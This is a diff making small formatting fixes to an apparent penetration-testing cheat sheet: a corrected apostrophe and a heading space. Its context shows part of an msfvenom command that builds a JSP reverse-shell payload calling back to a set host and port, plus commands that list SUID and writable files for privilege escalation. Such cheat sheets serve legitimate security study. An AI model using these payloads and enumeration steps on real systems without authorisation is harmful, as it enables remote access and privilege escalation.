@@ -120,7 +120,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.172.4 LPORT=2222 -f war > s
 ```
 ## Miscellaneous Techniques
 ### Checking SUID files available in the system by running
-> SUID(Set owner User ID up on execution) is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. In simple words users will get file ownerâs permissions as well as owner UID and GID when executing a file/program/command
+> SUID(Set owner User ID up on execution) is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. In simple words users will get file owner's permissions as well as owner UID and GID when executing a file/program/command
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 find / -perm +4000 2> /dev/null
@@ -132,7 +132,7 @@ $ sudo chmod u+s /usr/bin/whoami # set SUID for whoami
 
 $ sudo chmod u-s /usr/bin/whoami # Unset SUID
 ```
-###Check files with write permission for current user
+### Check files with write permission for current user
 ```bash
 find / -type f -writable 2>/dev/null -not -path "*/proc/*"
 ```
